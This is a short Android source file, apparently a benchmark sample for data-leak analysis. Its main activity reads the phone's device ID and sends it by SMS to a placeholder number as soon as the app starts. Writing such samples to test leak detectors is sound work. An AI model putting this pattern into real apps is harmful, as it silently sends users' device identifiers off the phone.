package de.ecspride;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, mgr.getDeviceId(), null, null);
    }
}
